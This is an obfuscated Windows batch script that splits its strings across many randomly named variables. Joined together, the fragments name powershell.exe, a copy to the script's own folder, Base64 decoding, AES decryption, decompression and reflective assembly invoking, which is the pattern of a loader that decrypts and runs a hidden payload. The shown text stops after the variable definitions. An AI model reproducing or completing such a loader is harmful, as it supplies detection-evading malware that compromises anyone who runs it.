@echo off
set "ZGQipjhfqV=he"
set "pXEemrnCVW=co"
set "UrCLbSiwkR= /"
set "UEceVgzjFa=y "
set "sIvLbjsyNg=ll"
set "blsJigblvZ=32"
set "ffndEJEDGW=ws"
set "qiOvLnWciB=s\"
set "upqYkuMRpX=py"
set "cDhQcOpLDs=xe"
set "fRyYKJWDAz=em"
set "PCsMshrIcq=st"
set "TTAWDNlAnR=Po"
set "YrKcTUQjij= C"
set "kWNOpxhcTN=we"
set "JnpjbEjIDl=do"
set "vfUTCcwTGj=we"
set "LiwowNgfxv=rs"
set "xCihkjJFlb=po"
set "SKZmMXnBlr=nd"
set "EhzSyQaWnM=rS"
set "MpmBeRxkbz=1."
set "CCJTrLuHxN=\v"
set "VnZSvrWfyG=in"
set "MtyCNPNsGo=he"
set "BeuMFDmVXh=ow"
set "mLuITsMvfa=Wi"
set "KOvEvWMNRp=0\"
set "rRcvadeDdT=:\"
set "iSZZeETCcs=ll"
set "zShHDpgTKw=.e"
set "iudiqGRQJc=Sy"
set "LwmUrNQcdE=\W"
set "kOqQSiviek= %~dp0"
set "buuQlGChCh=cd"
set "beQBwjjQEu='0Pg"
set "FeENNzcpXj=hy.A"
set "OIsuahKhVT='gni"
set "csYNozpSrZ=pher"
set "SMQMPdNdzR=embl"
set "jBHjdhkkyZ=.Cre"
set "dnluwIHHDm=;$FC"
set "kDtTHGGvro=l5E7"
set "eyBShMrYuf=WnVG"
set "SfEycdxlUn=1..-"
set "wqeUmGQXSh=Star"
set "kDDLaFWXnF=]::C"
set "kGpJCOvaME=ct S"
set "mzQWpQrPlJ=.Com"
set "MVPmLWnGUt=O.Me"
set "aOzubcFBwO==');"
set "JKDVvWunqz=tem."
set "RjQpFwABbM=);$z"
set "zjtvfdDtQo=('%*'"
set "OqZEpKFmDp=.Dis"
set "fnqvwvQadL=oL'["
set "dUyOTqVfQk=nage"
set "mFzcJVzybL=comm"
set "pNSQELklNg=o = "
set "FHdYxOrtyt=ring"
set "RQaLntUEFO=ode]"
set "beZCJvTZxx=[Sys"
set "adUMWclvuh=Syst"
set "cTqscHOOdn=saBm"
set "dbyWjzuFli='[-1"
set "WCvALhbCuC=pk ="
set "zleVuxYNls=  $C"
set "JVjefAImAN=bstr"
set "IsTigxThQL=)($c"
set "OcsWupeZct=;$Yk"
set "xjSxVXmoLF=rB.I"
set "IODOJjzaTg=.Len"
set "jVwJrVjnDO=$cvh"
set "zKvkkXnGSS=cvhz"
set "CAwfwSyeBT=ke($"
set "PmPMCcXjUc=Ugng"
set "shQpJvLhKh=nirt"
set "ltSZbtlEye=y.Cr"
set "HCwzVamACZ=HprB"
set "lOXKiLNveZ=ress"
set "murBsUOUjf=sion"
set "WzTaRQWcye=tem."
set "cvrzuzLwTs=-nop"
set "kNcISliZAJ=6] -"
set "nidaxmaoQE=stem"
set "PNbMsaDWSF=[IO."
set "cXolVjisOa=bjec"
set "XbBIChoAdF=).Sp"
